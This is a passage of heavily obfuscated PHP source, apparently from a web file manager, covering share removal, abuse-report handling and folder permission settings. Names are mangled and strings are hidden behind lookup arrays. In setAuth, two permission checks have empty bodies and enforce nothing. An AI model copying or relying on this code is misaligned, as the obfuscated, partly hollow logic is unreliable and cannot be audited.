$Üéş• = substr($æ¸Å‘¾€[$…Ëàá•ä[604]], strpos($æ¸Å‘¾€[$…Ëàá•ä[604]], $ËØêİ“Œ)); $¿ƒçàÖÎ = array($…Ëàá•ä[191] => array($…Ëàá•ä[7], trim($Üéş•, $…Ëàá•ä[50]))); $„©“×™º = Model($…Ëàá•ä[924])->where($¿ƒçàÖÎ)->field($…Ëàá•ä[32])->select(); $ÂÚ”Ó«Ş = array_to_keyvalue($„©“×™º, $…Ëàá•ä[12], $…Ëàá•ä[32]); $ÂÚ”Ó«Ş[] = $æ¸Å‘¾€[$…Ëàá•ä[32]]; return implode($…Ëàá•ä[8], $ÂÚ”Ó«Ş); } protected function remove($ğ¨“şàá) { $Â‰”·úÒ =& $_SERVER[¹Éµ„ºå]; $ £Ä­¸ = is_array($ğ¨“şàá) ? $ğ¨“şàá : array($ğ¨“şàá); for ($ŒµÇ×âö = 0; $ŒµÇ×âö < count($ £Ä­¸); $ŒµÇ×âö++) { $¯áğ…É = $this->getInfo($ £Ä­¸[$ŒµÇ×âö]); if ($¯áğ…É[$Â‰”·úÒ[685]] == $Â‰”·úÒ[91]) { Model($Â‰”·úÒ[655])->eventShare($¯áğ…É[$Â‰”·úÒ[191]], $Â‰”·úÒ[2328]); } if ($¯áğ…É[$Â‰”·úÒ[578]] == $Â‰”·úÒ[91]) { Model($Â‰”·úÒ[655])->eventShare($¯áğ…É[$Â‰”·úÒ[191]], $Â‰”·úÒ[2327]); } } $×Å­¸±ù = array($Â‰”·úÒ[687] => array($Â‰”·úÒ[7], $ £Ä­¸)); $©…æÖÍ½ = $this->where($×Å­¸±ù)->delete(); if ($©…æÖÍ½) { Model($Â‰”·úÒ[688])->where($×Å­¸±ù)->delete(); } return $©…æÖÍ½; } protected function removeBySource($ô®à€ÁÅ) { $ûŸ¿ â =& $_SERVER[¹Éµ„ºå]; $š¶ùÛ»Ô = array($ûŸ¿ â[506] => array($ûŸ¿ â[507], $ô®à€ÁÅ)); $ôä€†“† = $this->field($ûŸ¿ â[687])->where($š¶ùÛ»Ô)->select(); $„Š¦ëãú = array_to_keyvalue($ôä€†“†, $ûŸ¿ â[12], $ûŸ¿ â[687]); if (!$„Š¦ëãú) { return; } foreach ($ôä€†“† as $´ÉÎ—å•) { $this->cacheFunctionClear($ûŸ¿ â[2344], $´ÉÎ—å•[$ûŸ¿ â[687]]); } $š¶ùÛ»Ô = array($ûŸ¿ â[2333] => array($ûŸ¿ â[507], $„Š¦ëãú)); $this->where($š¶ùÛ»Ô)->delete(); Model($ûŸ¿ â[688])->where($š¶ùÛ»Ô)->delete(); } public function listAll($Óà“ü÷) { $Šâ²ü†€ =& $_SERVER[¹Éµ„ºå]; $¯Ûêå®Ä = array(); if ($Óà“ü÷[$Šâ²ü†€[1582]]) { $¯Ûêå®Ä[$Šâ²ü†€[1582]] = $Óà“ü÷[$Šâ²ü†€[1582]]; } if ($Óà“ü÷[$Šâ²ü†€[852]]) { $ öóË’ = $Óà“ü÷[$Šâ²ü†€[853]] ? $Óà“ü÷[$Šâ²ü†€[853]] : strtotime(date($Šâ²ü†€[2345])); $¯Ûêå®Ä[$Šâ²ü†€[231]] = array($Šâ²ü†€[408], array($Óà“ü÷[$Šâ²ü†€[852]], $ öóË’)); } if ($Óà“ü÷[$Šâ²ü†€[33]]) { $¯Ûêå®Ä[$Óà“ü÷[$Šâ²ü†€[33]]] = 1; } else { $¯Ûêå®Ä[] = array($Šâ²ü†€[578] => array($Šâ²ü†€[1169], 0), $Šâ²ü†€[685] => array($Šâ²ü†€[1169], 0), $Šâ²ü†€[2317] => $Šâ²ü†€[2273]); } if ($Óà“ü÷[$Šâ²ü†€[2269]]) { $¯Ûêå®Ä[] = array($Šâ²ü†€[1544] => $Óà“ü÷[$Šâ²ü†€[2269]], $Šâ²ü†€[1854] => array($Šâ²ü†€[473], "\45{$Óà“ü÷[$Šâ²ü†€[2269]]}\45"), $Šâ²ü†€[2317] => $Šâ²ü†€[2273]); } $ˆÑ…ûäÄ = $this->_makeOrder()->where($¯Ûêå®Ä)->selectPage(20); if (empty($ˆÑ…ûäÄ[$Šâ²ü†€[446]])) { return array(); } $this->_listDataApply($ˆÑ…ûäÄ[$Šâ²ü†€[446]]); return $ˆÑ…ûäÄ; } public function listDataApply($ıêÍ™¼È) { $this->_listDataApply($ıêÍ™¼È); return $ıêÍ™¼È; } private function _listDataApply(&$âµ´ßòÅ) { $¸³ªƒ®Æ =& $_SERVER[¹Éµ„ºå]; $—ğêœá = array_to_keyvalue($âµ´ßòÅ, $¸³ªƒ®Æ[12], $¸³ªƒ®Æ[1582]); $ƒ¾—ÏÏÕ = Model($¸³ªƒ®Æ[617])->userListInfo(array_unique($—ğêœá)); $ˆÓôåî = array_to_keyvalue($âµ´ßòÅ, $¸³ªƒ®Æ[12], $¸³ªƒ®Æ[191]); $Å€À‚˜Ó = Model($¸³ªƒ®Æ[924])->sourceListInfo($ˆÓôåî, !0); foreach ($âµ´ßòÅ as $Óı£«¹í => &$öû‘¯Å¯) { $ÖôÑ›ŞÃ = $öû‘¯Å¯[$¸³ªƒ®Æ[1582]]; $öû‘¯Å¯[$¸³ªƒ®Æ[2346]] = $ƒ¾—ÏÏÕ[$ÖôÑ›ŞÃ] ? $ƒ¾—ÏÏÕ[$ÖôÑ›ŞÃ] : !1; if (!$öû‘¯Å¯[$¸³ªƒ®Æ[2346]] || $öû‘¯Å¯[$¸³ªƒ®Æ[2346]][$¸³ªƒ®Æ[841]] != $¸³ªƒ®Æ[91]) { unset($âµ´ßòÅ[$Óı£«¹í]); continue; } $¬æ†ù¤´ = $öû‘¯Å¯[$¸³ªƒ®Æ[191]]; $öû‘¯Å¯[$¸³ªƒ®Æ[90]] = $Å€À‚˜Ó[$¬æ†ù¤´] ? $Å€À‚˜Ó[$¬æ†ù¤´] : !1; if ($öû‘¯Å¯[$¸³ªƒ®Æ[90]][$¸³ªƒ®Æ[520]] == $¸³ªƒ®Æ[91]) { unset($âµ´ßòÅ[$Óı£«¹í]); } if ($öû‘¯Å¯[$¸³ªƒ®Æ[90]] != $¸³ªƒ®Æ[228] && !$öû‘¯Å¯[$¸³ªƒ®Æ[90]]) { unset($âµ´ßòÅ[$Óı£«¹í]); } } unset($öû‘¯Å¯); $âµ´ßòÅ = array_values($âµ´ßòÅ); } private function _makeOrder($å¾å¨Í¼ = '') { $®‘ƒ‰ê÷ =& $_SERVER[¹Éµ„ºå]; $Äõ¹¿Á = array($®‘ƒ‰ê÷[231], $®‘ƒ‰ê÷[853], $®‘ƒ‰ê÷[2330], $®‘ƒ‰ê÷[2331]); $ªËá‚¯ = array($®‘ƒ‰ê÷[537] => $®‘ƒ‰ê÷[538], $®‘ƒ‰ê÷[539] => $®‘ƒ‰ê÷[540]); $û‚Üšêå = Input::get($®‘ƒ‰ê÷[544], $®‘ƒ‰ê÷[7], $®‘ƒ‰ê÷[512], $Äõ¹¿Á); $£‹ë‚ùï = Input::get($®‘ƒ‰ê÷[545], $®‘ƒ‰ê÷[7], $®‘ƒ‰ê÷[2347], array($®‘ƒ‰ê÷[2266], $®‘ƒ‰ê÷[539])); $£‹ë‚ùï = $ªËá‚¯[$£‹ë‚ùï]; $å¾å¨Í¼ = $å¾å¨Í¼ . "{$û‚Üšêå}\x20{$£‹ë‚ùï}"; return $this->order($å¾å¨Í¼); } public function reportAdd($ú¡‰ÈòÇ) { $½áÃÛï¯ =& $_SERVER[¹Éµ„ºå]; $€¨üßÒ = array($½áÃÛï¯[687] => $ú¡‰ÈòÇ[$½áÃÛï¯[687]], $½áÃÛï¯[1582] => USER_ID); if (Model($½áÃÛï¯[2342])->where($€¨üßÒ)->find()) { return !1; } $å´Ş¨ïì = array($½áÃÛï¯[687] => $ú¡‰ÈòÇ[$½áÃÛï¯[687]], $½áÃÛï¯[1854] => $ú¡‰ÈòÇ[$½áÃÛï¯[1854]], $½áÃÛï¯[191] => $ú¡‰ÈòÇ[$½áÃÛï¯[191]], $½áÃÛï¯[557] => $ú¡‰ÈòÇ[$½áÃÛï¯[557]], $½áÃÛï¯[1582] => USER_ID, $½áÃÛï¯[33] => $ú¡‰ÈòÇ[$½áÃÛï¯[33]], $½áÃÛï¯[540] => $ú¡‰ÈòÇ[$½áÃÛï¯[540]]); return Model($½áÃÛï¯[2342])->add($å´Ş¨ïì); } public function reportList($ÅÇ½ªÜ) { $ë„ãú˜ =& $_SERVER[¹Éµ„ºå]; $…µ§úäÆ = array(); if ($ÅÇ½ªÜ[$ë„ãú˜[852]]) { $ıÀ¦âíŸ = $ÅÇ½ªÜ[$ë„ãú˜[853]] ? $ÅÇ½ªÜ[$ë„ãú˜[853]] : strtotime(date($ë„ãú˜[2345])); $…µ§úäÆ[$ë„ãú˜[231]] = array($ë„ãú˜[408], array($ÅÇ½ªÜ[$ë„ãú˜[852]], $ıÀ¦âíŸ)); } if (isset($ÅÇ½ªÜ[$ë„ãú˜[33]]) && in_array($ÅÇ½ªÜ[$ë„ãú˜[33]], array($ë„ãú˜[91], $ë„ãú˜[524], $ë„ãú˜[2348], $ë„ãú˜[2349], $ë„ãú˜[2350]))) { $…µ§úäÆ[$ë„ãú˜[33]] = $ÅÇ½ªÜ[$ë„ãú˜[33]]; } if (isset($ÅÇ½ªÜ[$ë„ãú˜[841]]) && in_array($ÅÇ½ªÜ[$ë„ãú˜[841]], array($ë„ãú˜[228], $ë„ãú˜[91], $ë„ãú˜[524], $ë„ãú˜[2348]))) { $…µ§úäÆ[$ë„ãú˜[841]] = $ÅÇ½ªÜ[$ë„ãú˜[841]]; } $Œ“Áãœ = Input::get($ë„ãú˜[545], $ë„ãú˜[7], $ë„ãú˜[2347], array($ë„ãú˜[2266], $ë„ãú˜[539])); $Ã´‡–… = array($ë„ãú˜[537] => $ë„ãú˜[538], $ë„ãú˜[539] => $ë„ãú˜[540]); $Âø­®ß© = $ë„ãú˜[2351] . $Ã´‡–…[$Œ“Áãœ]; $³ºØÇ‘½ = Model($ë„ãú˜[2342])->where($…µ§úäÆ)->order($Âø­®ß©)->selectPage(20); if (empty($³ºØÇ‘½[$ë„ãú˜[446]])) { return array(); } $·ÜÁÁ = array_to_keyvalue_group($³ºØÇ‘½[$ë„ãú˜[446]], $ë„ãú˜[841], $ë„ãú˜[687]); if (!empty($·ÜÁÁ[0])) { $ÅÇ½ªÜ = $·ÜÁÁ[0]; $…µ§úäÆ = array($ë„ãú˜[687] => array($ë„ãú˜[7], $ÅÇ½ªÜ)); $£Ô¥Æ¶Ğ = $this->where($…µ§úäÆ)->field($ë„ãú˜[687])->select(); $£Ô¥Æ¶Ğ = array_to_keyvalue($£Ô¥Æ¶Ğ, $ë„ãú˜[12], $ë„ãú˜[687]); $ÓÒ“Š·Ø = array_diff($ÅÇ½ªÜ, $£Ô¥Æ¶Ğ); if (!empty($ÓÒ“Š·Ø)) { foreach ($³ºØÇ‘½[$ë„ãú˜[446]] as $Ê¯ê›œï => $ÁÚ¹©Ş…) { if (in_array($ÁÚ¹©Ş…[$ë„ãú˜[687]], $ÓÒ“Š·Ø)) { unset($³ºØÇ‘½[$ë„ãú˜[446]][$Ê¯ê›œï]); } } } } $this->_listDataApply($³ºØÇ‘½[$ë„ãú˜[446]]); return $³ºØÇ‘½; } public function reportStatus($òÎ°»µ†) { $¼äº¾ê¦ =& $_SERVER[¹Éµ„ºå]; $¯¿©ˆƒí = array($¼äº¾ê¦[487] => $òÎ°»µ†[$¼äº¾ê¦[487]]); $·×ùˆ¤Ã = Model($¼äº¾ê¦[2342])->where($¯¿©ˆƒí)->field($¼äº¾ê¦[2352])->find(); if (!$·×ùˆ¤Ã) { return !1; } $ÍµÇ‰ÚÊ = array($¼äº¾ê¦[841] => $òÎ°»µ†[$¼äº¾ê¦[841]]); if ($òÎ°»µ†[$¼äº¾ê¦[841]] == $¼äº¾ê¦[2348] && $·×ùˆ¤Ã[$¼äº¾ê¦[841]] == $¼äº¾ê¦[2348]) { $ÍµÇ‰ÚÊ[$¼äº¾ê¦[841]] = 0; } $™›£Ù = Model($¼äº¾ê¦[2342])->where($¯¿©ˆƒí)->save($ÍµÇ‰ÚÊ); if ($òÎ°»µ†[$¼äº¾ê¦[841]] == $¼äº¾ê¦[524]) { if ($·×ùˆ¤Ã[$¼äº¾ê¦[557]] != $¼äº¾ê¦[228] && $this->shareFileMeta($·×ùˆ¤Ã[$¼äº¾ê¦[557]])) { $this->shareFileMeta($·×ùˆ¤Ã[$¼äº¾ê¦[557]], 0); } $this->remove($·×ùˆ¤Ã[$¼äº¾ê¦[687]]); return !0; } if ($™›£Ù && $òÎ°»µ†[$¼äº¾ê¦[841]] == $¼äº¾ê¦[2348]) { $‡Ü×ÉÑ¦ = $ÍµÇ‰ÚÊ[$¼äº¾ê¦[841]] == $¼äº¾ê¦[2348] ? 1 : 0; $this->shareFileMeta($·×ùˆ¤Ã[$¼äº¾ê¦[557]], $‡Ü×ÉÑ¦); $this->removeByFile($·×ùˆ¤Ã[$¼äº¾ê¦[557]]); } return $™›£Ù; } private function removeByFile($Ø’Òü¨) { $Ç·ï”¶¤ =& $_SERVER[¹Éµ„ºå]; $ñÖ’Öì™ = Model($Ç·ï”¶¤[924])->where(array($Ç·ï”¶¤[557] => $Ø’Òü¨))->field($Ç·ï”¶¤[191])->select(); $¢ÀÌÚúÉ = array_to_keyvalue($ñÖ’Öì™, $Ç·ï”¶¤[12], $Ç·ï”¶¤[191]); $ÔÔã¾…‚ = array($Ç·ï”¶¤[191] => array($Ç·ï”¶¤[7], $¢ÀÌÚúÉ), $Ç·ï”¶¤[578] => 1); $ñÖ’Öì™ = $this->where($ÔÔã¾…‚)->field($Ç·ï”¶¤[687])->select(); if (empty($ñÖ’Öì™)) { return; } $×¦É¶ã— = array_to_keyvalue($ñÖ’Öì™, $Ç·ï”¶¤[12], $Ç·ï”¶¤[687]); $this->remove($×¦É¶ã—); } private function shareFileMeta($·Ì÷à„”, $é„é®¸ˆ = null) { $²ÁòÌ’Ì =& $_SERVER[¹Éµ„ºå]; $ö¦õÃ¶Ğ = array($²ÁòÌ’Ì[557] => $·Ì÷à„”, $²ÁòÌ’Ì[95] => $²ÁòÌ’Ì[2353]); if (is_null($é„é®¸ˆ)) { return Model($²ÁòÌ’Ì[2354])->where($ö¦õÃ¶Ğ)->find(); } $ö¦õÃ¶Ğ[$²ÁòÌ’Ì[451]] = $é„é®¸ˆ; Model($²ÁòÌ’Ì[2354])->add($ö¦õÃ¶Ğ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\162\x63\x65\x5f\141\x75\x74\x68"; public function getAuth($åë°‡ÏÉ) { $ªú¾¼ =& $_SERVER[¹Éµ„ºå]; $ÕğÇÈ§™ = $this->sourceAuthSelect($åë°‡ÏÉ); $¥áÖ´§ = array(); $…—§·§ğ = array(); $ù…şëğ¥ = 2 << 25; foreach ($ÕğÇÈ§™ as $İ³‘éö) { $›œ îÚÖ = Model($ªú¾¼[591])->listData($İ³‘éö[$ªú¾¼[1630]]); if (!$›œ îÚÖ) { continue; } $¥áÖ´§[] = $İ³‘éö; $«Â‚Ã¿¥ = 0; if ($İ³‘éö[$ªú¾¼[188]] == SourceModel::TYPE_GROUP) { $«Â‚Ã¿¥ = $ù…şëğ¥ * 2; } if ($İ³‘éö[$ªú¾¼[188]] == SourceModel::TYPE_USER) { $«Â‚Ã¿¥ = $ù…şëğ¥; } if ($İ³‘éö[$ªú¾¼[188]] == SourceModel::TYPE_USER && $İ³‘éö[$ªú¾¼[589]] == $ªú¾¼[228]) { $«Â‚Ã¿¥ = 0; } $…—§·§ğ[] = $›œ îÚÖ[$ªú¾¼[502]] + $«Â‚Ã¿¥; } array_multisort($…—§·§ğ, SORT_DESC, $¥áÖ´§); return $¥áÖ´§; } public function sourceAuthSelect($»¹íËï) { $à°ôœªí =& $_SERVER[¹Éµ„ºå]; static $şì·Ó”¿ = array(); $Æ•±Ä™ = is_array($»¹íËï) ? !1 : !0; if ($Æ•±Ä™) { $»¹íËï = array($»¹íËï); } $”‹³«õŠ = array(); foreach ($»¹íËï as $íÒ‘Ê²ß) { if (isset($şì·Ó”¿[$íÒ‘Ê²ß])) { $”‹³«õŠ[$íÒ‘Ê²ß] = $şì·Ó”¿[$íÒ‘Ê²ß]; } } if (count($”‹³«õŠ) == count($»¹íËï)) { return $Æ•±Ä™ ? $”‹³«õŠ[$»¹íËï[0]] : $”‹³«õŠ; } $ë®‚»–Ó = $à°ôœªí[2355]; $¬º³öŠÇ = array($à°ôœªí[191] => array($à°ôœªí[7], $»¹íËï)); $Ïøİú¸Ô = $this->field($ë®‚»–Ó)->order($à°ôœªí[487])->where($¬º³öŠÇ)->select(); $Ã¹¹û‚ñ = array_to_keyvalue_group($Ïøİú¸Ô, $à°ôœªí[191]); foreach ($»¹íËï as $íÒ‘Ê²ß) { $şì·Ó”¿[$íÒ‘Ê²ß] = $Ã¹¹û‚ñ[$íÒ‘Ê²ß] ? $Ã¹¹û‚ñ[$íÒ‘Ê²ß] : array(); } if ($Æ•±Ä™) { return $Ïøİú¸Ô; } return $Ã¹¹û‚ñ; } public function setAuth($†â¾×ÏĞ, $ºÉ€éşú) { $®ƒàÇ =& $_SERVER[¹Éµ„ºå]; $©Í§ÂÓ = Model($®ƒàÇ[1523])->sourceInfo($†â¾×ÏĞ); if (!$©Í§ÂÓ) { return !1; } if ($©Í§ÂÓ[$®ƒàÇ[188]] != SourceModel::TYPE_GROUP) { return !1; } $¥ìÆÛğè = 1; $¹ÓêÈÉ» = $©Í§ÂÓ[$®ƒàÇ[589]]; if ($¹ÓêÈÉ» != $¥ìÆÛğè) { $í›çï‘‰ = array($®ƒàÇ[1484] => $¹ÓêÈÉ»); $ Ë×îƒø = Model($®ƒàÇ[2265])->field($®ƒàÇ[1582])->where($í›çï‘‰)->select(); $ Ë×îƒø = array_to_keyvalue($ Ë×îƒø, $®ƒàÇ[12], $®ƒàÇ[1582]); } $¡ ‹é£‹ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $±ØĞà°ë = array(); foreach ($ºÉ€éşú as $®¡éÊ°ƒ) { if (!in_array($®¡éÊ°ƒ[$®ƒàÇ[188]], $¡ ‹é£‹)) { show_json(LNG($®ƒàÇ[2356]), !1); } if ($¹ÓêÈÉ» != $¥ìÆÛğè) { if ($®¡éÊ°ƒ[$®ƒàÇ[188]] == SourceModel::TYPE_GROUP) { } if ($®¡éÊ°ƒ[$®ƒàÇ[589]] != 0 && !in_array($®¡éÊ°ƒ[$®ƒàÇ[589]], $ Ë×îƒø)) { } } if ($®¡éÊ°ƒ[$®ƒàÇ[589]] == 0) { $®¡éÊ°ƒ[$®ƒàÇ[188]] = SourceModel::TYPE_USER; } $±ØĞà°ë[] = array($®ƒàÇ[191] => $†â¾×ÏĞ, $®ƒàÇ[188] => intval($®¡éÊ°ƒ[$®ƒàÇ[188]]), $®ƒàÇ[589] => intval($®¡éÊ°ƒ[$®ƒàÇ[589]]), $®ƒàÇ[1630] => intval($®¡éÊ°ƒ[$®ƒàÇ[1630]]) ? intval($®¡éÊ°ƒ[$®ƒàÇ[1630]]) : 0, $®ƒàÇ[2334] => intval($®¡éÊ°ƒ[$®ƒàÇ[2334]]) ? intval($®¡éÊ°ƒ[$®ƒàÇ[2334]]) : -1); } $this->where(array($®ƒàÇ[506] => $†â¾×ÏĞ))->delete(); $this->addAll($±ØĞà°ë); return !0; } public function authClear($Š²ÕÁÀé) { $Öë½®Œ¦ =& $_SERVER[¹Éµ„ºå]; $òÂ®¸´½ = Model($Öë½®Œ¦[1523])->sourceInfo($Š²ÕÁÀé); $å½¿µõ = array($Š²ÕÁÀé); if ($òÂ®¸´½[$Öë½®Œ¦[500]] == $Öë½®Œ¦[91]) { $ƒğË  = array($Öë½®Œ¦[674] => array($Öë½®Œ¦[635], $òÂ®¸´½[$Öë½®Œ¦[604]] . $Š²ÕÁÀé . $Öë½®Œ¦[636])); $å½¿µõ = Model($Öë½®Œ¦[1523])->field($Öë½®Œ¦[506])->where($ƒğË )->getField($Öë½®Œ¦[191], !0); $å½¿µõ[] = $Š²ÕÁÀé; } $this->where(array($Öë½®Œ¦[506] => array($Öë½®Œ¦[507], $å½¿µõ)))->delete(); return !0; } public function getAllParent($Â¿â¡»ş) { $‡Õ–ä•” =& $_SERVER[¹Éµ„ºå]; $ÏšÁ‘›° = Model($‡Õ–ä•”[1523])->sourceInfo($Â¿â¡»ş); if (!$ÏšÁ‘›° || $ÏšÁ‘›°[$‡Õ–ä•”[188]] != SourceModel::TYPE_GROUP) { return array(); } $Ö“¯©å¨ = Model($‡Õ–ä•”[1523])->parentLevelArray($ÏšÁ‘›°[$‡Õ–ä•”[604]]); $£ÄÄŠèı = array_merge(array(intval($Â¿â¡»ş)), array_reverse($Ö“¯©å¨)); $£¡×ÜÑô = $this->sourceAuthSelect($£ÄÄŠèı); $¼õæëîÖ = $GLOBALS[$‡Õ–ä•”[6]][$‡Õ–ä•”[92]][$‡Õ–ä•”[2278]] == 1; $Ä±óÅç = $¼õæëîÖ ? 3 : 2; $ø•ÔéÇĞ = Model($‡Õ–ä•”[1482])->getInfo($ÏšÁ‘›°[$‡Õ–ä•”[589]]); $Å“í˜Š‰ = explode($‡Õ–ä•”[50], trim($ø•ÔéÇĞ[$‡Õ–ä•”[604]], $‡Õ–ä•”[50])); $Âäœä™ = array_merge(array($ø•ÔéÇĞ[$‡Õ–ä•”[1484]]), array_reverse(array_slice($Å“í˜Š‰, $Ä±óÅç))); foreach ($£¡×ÜÑô as $Â¿â¡»ş => $º°¨”²­) { foreach ($º°¨”²­ as $•ùë¾Üë) { if (!$•ùë¾Üë || !$•ùë¾Üë[$‡Õ–ä•”[589]] || $•ùë¾Üë[$‡Õ–ä•”[589]] == $‡Õ–ä•”[228]) { continue; } if ($•ùë¾Üë[$‡Õ–ä•”[188]] != SourceModel::TYPE_GROUP) { continue; } $Âäœä™[] = $•ùë¾Üë[$‡Õ–ä•”[589]]; } } $Âäœä™ = array_unique($Âäœä™); $âêÌ„½µ = array($‡Õ–ä•”[428] => _get($GLOBALS[$‡Õ–ä•”[7]], $‡Õ–ä•”[428], 1), $‡Õ–ä•”[439] => _get($GLOBALS[$‡Õ–ä•”[7]], $‡Õ–ä•”[439], 500)); $GLOBALS[$‡Õ–ä•”[7]][$‡Õ–ä•”[428]] = 1; $GLOBALS[$‡Õ–ä•”[7]][$‡Õ–ä•”[439]] = 500; $îéóçı = array($‡Õ–ä•”[508] => 0, $‡Õ–ä•”[2177] => AuthModel::authAll(), $‡Õ–ä•”[509] => LNG($‡Õ–ä•”[2357]), $‡Õ–ä•”[2192] => $‡Õ–ä•”[2358]); $¶ÅÑ€ü = array(); $«Àş‡õÄ = explode($‡Õ–ä•”[50], $‡Õ–ä•”[2359]); $¾ÏÄ£È‹ = explode($‡Õ–ä•”[50], $‡Õ–ä•”[2360]); foreach ($Âäœä™ as $Åå¨¹÷÷) { $«ô‚œ® = Model($‡Õ–ä•”[1482])->getInfo($Åå¨¹÷÷); $ùÄâ—ƒà = array_field_key($«ô‚œ®, $«Àş‡õÄ); $€¼»âŸ = Model($‡Õ–ä•”[617])->listByGroup($Åå¨¹÷÷); foreach ($€¼»âŸ[$‡Õ–ä•”[446]] as $ñÖ™¾Éã => $İ·†ïÇ‘) { $this->userGroupList($İ·†ïÇ‘[$‡Õ–ä•”[1582]], $İ·†ïÇ‘); $œ«àÃ = $İ·†ïÇ‘[$‡Õ–ä•”[1582]] . $‡Õ–ä•”[12]; if (isset($¶ÅÑ€ü[$œ«àÃ])) { continue; } $¢âñÕ‚ = Model($‡Õ–ä•”[2361])->listData($İ·†ïÇ‘[$‡Õ–ä•”[2362]]); $İ·†ïÇ‘[$‡Õ–ä•”[2363]] = Action($‡Õ–ä•”[2364])->parseUrl($İ·†ïÇ‘[$‡Õ–ä•”[2363]]); $İ·†ïÇ‘[$‡Õ–ä•”[1930]] = $¢âñÕ‚ && $¢âñÕ‚[$‡Õ–ä•”[2365]] == 1; $€ˆŒÄĞİ = $this->groupRootAuth($Åå¨¹÷÷, $İ·†ïÇ‘[$‡Õ–ä•”[1582]]); $€ˆŒÄĞİ = $İ·†ïÇ‘[$‡Õ–ä•”[1930]] ? $îéóçı : $€ˆŒÄĞİ; $¶ÅÑ€ü[$œ«àÃ] = array($‡Õ–ä•”[2366] => $‡Õ–ä•”[2367], $‡Õ–ä•”[2368] => LNG($‡Õ–ä•”[2369]), $‡Õ–ä•”[2346] => array_field_key($İ·†ïÇ‘, $¾ÏÄ£È‹), $‡Õ–ä•”[502] => $€ˆŒÄĞİ, $‡Õ–ä•”[503] => $€ˆŒÄĞİ[$‡Õ–ä•”[502]], $‡Õ–ä•”[2370] => $ùÄâ—ƒà); } } $GLOBALS[$‡Õ–ä•”[7]][$‡Õ–ä•”[428]] = $âêÌ„½µ[$‡Õ–ä•”[428]]; $GLOBALS[$‡Õ–ä•”[7]][$‡Õ–ä•”[439]] = $âêÌ„½µ[$‡Õ–ä•”[439]]; foreach ($£¡×ÜÑô as $Â¿â¡»ş => $º°¨”²­) { if (!$º°¨”²­) { continue; } foreach ($º°¨”²­ as $•ùë¾Üë) { if (!$•ùë¾Üë || !$•ùë¾Üë[$‡Õ–ä•”[589]] || $•ùë¾Üë[$‡Õ–ä•”[589]] == $‡Õ–ä•”[228]) { continue; } if ($•ùë¾Üë[$‡Õ–ä•”[188]] != SourceModel::TYPE_USER) { continue; } $œ«àÃ = $•ùë¾Üë[$‡Õ–ä•”[589]] . $‡Õ–ä•”[12]; if (isset($¶ÅÑ€ü[$œ«àÃ])) { continue; } $ÈÎ‘±Ûè = $this->authMake($º°¨”²­, $œ«àÃ); if (!$ÈÎ‘±Ûè || !$ÈÎ‘±Ûè[$‡Õ–ä•”[2368]]) { continue; } $¶ÅÑ€ü[$œ«àÃ] = array($‡Õ–ä•”[2366] => $‡Õ–ä•”[2371], $‡Õ–ä•”[2368] => $ÈÎ‘±Ûè[$‡Õ–ä•”[2368]], $‡Õ–ä•”[2346] => Model($‡Õ–ä•”[617])->getInfoSimpleOuter($œ«àÃ), $‡Õ–ä•”[502] => $ÈÎ‘±Ûè[$‡Õ–ä•”[556]], $‡Õ–ä•”[503] => $ÈÎ‘±Ûè[$‡Õ–ä•”[556]][$‡Õ–ä•”[502]], $‡Õ–ä•”[2370] => $ÈÎ‘±Ûè[$‡Õ–ä•”[2372]]); } } foreach ($£¡×ÜÑô as $Â¿â¡»ş => $º°¨”²­) { if (!$º°¨”²­) { continue; } foreach ($¶ÅÑ€ü as $œ«àÃ => $šÃ‰¿áµ) { if ($šÃ‰¿áµ[$‡Õ–ä•”[2346]][$‡Õ–ä•”[1930]] || $šÃ‰¿áµ[$‡Õ–ä•”[2366]] == $‡Õ–ä•”[2371]) { continue; } $ÈÎ‘±Ûè = $this->authMake($º°¨”²­, $œ«àÃ); if (!$ÈÎ‘±Ûè || !$ÈÎ‘±Ûè[$‡Õ–ä•”[2368]]) { continue; } $¶ÅÑ€ü[$œ«àÃ] = array($‡Õ–ä•”[2366] => $‡Õ–ä•”[2371], $‡Õ–ä•”[2368] => $ÈÎ‘±Ûè[$‡Õ–ä•”[2368]], $‡Õ–ä•”[2346] => $šÃ‰¿áµ[$‡Õ–ä•”[2346]], $‡Õ–ä•”[502] => $ÈÎ‘±Ûè[$‡Õ–ä•”[556]], $‡Õ–ä•”[503] => $ÈÎ‘±Ûè[$‡Õ–ä•”[556]][$‡Õ–ä•”[502]], $‡Õ–ä•”[2370] => $ÈÎ‘±Ûè[$‡Õ–ä•”[2372]]); } } $¶ÅÑ€ü = array_sort_by($¶ÅÑ€ü, $‡Õ–ä•”[503], $‡Õ–ä•”[540]); return $¶ÅÑ€ü; } public function getAllChildren($¼šê§ÜĞ) { $¢¯¿Œ´ =& $_SERVER[¹Éµ„ºå]; $‡‰àƒƒŸ = Model($¢¯¿Œ´[1523])->sourceInfo($¼šê§ÜĞ); if ($‡‰àƒƒŸ[$¢¯¿Œ´[500]] != $¢¯¿Œ´[91]) { return $this->sourceListAuth(array($¼šê§ÜĞ)); } if ($‡‰àƒƒŸ[$¢¯¿Œ´[188]] != SourceModel::TYPE_GROUP) { return array(); } $‘ª¹£ü = 1; $Ú‰˜é³õ = array($¼šê§ÜĞ); if ($‡‰àƒƒŸ[$¢¯¿Œ´[190]] == $¢¯¿Œ´[228] && $‡‰àƒƒŸ[$¢¯¿Œ´[589]] != $‘ª¹£ü) { $Ú‰˜é³õ = $this->groupChidldAllRootSource($‡‰àƒƒŸ[$¢¯¿Œ´[589]]); } $±¼«êñ = $this->field($¢¯¿Œ´[191])->group($¢¯¿Œ´[191])->select(); $±¼«êñ = array_to_keyvalue($±¼«êñ, $¢¯¿Œ´[12], $¢¯¿Œ´[191]); if (!$±¼«êñ) { return array(); } $ñÍ›† = $¢¯¿Œ´[2373]; $¢ƒÊ¢† = array($¢¯¿Œ´[191] => array($¢¯¿Œ´[7], $±¼«êñ), $¢¯¿Œ´[520] => $¢¯¿Œ´[228]); $ÅÒäÔ»« = Model($¢¯¿Œ´[924])->field($ñÍ›†)->where($¢ƒÊ¢†)->select(); $™ŠºÊü = array($¼šê§ÜĞ); foreach ($ÅÒäÔ»« as $ãŸ´½£) { foreach ($Ú‰˜é³õ as $÷õ¡çæ) { $±®¶Ÿ‘ˆ = $¢¯¿Œ´[50] . $÷õ¡çæ . $¢¯¿Œ´[50]; $¢˜Şá›› = $ãŸ´½£[$¢¯¿Œ´[604]] . $ãŸ´½£[$¢¯¿Œ´[191]] . $¢¯¿Œ´[50]; if (strstr($¢˜Şá››, $±®¶Ÿ‘ˆ)) { $™ŠºÊü[] = 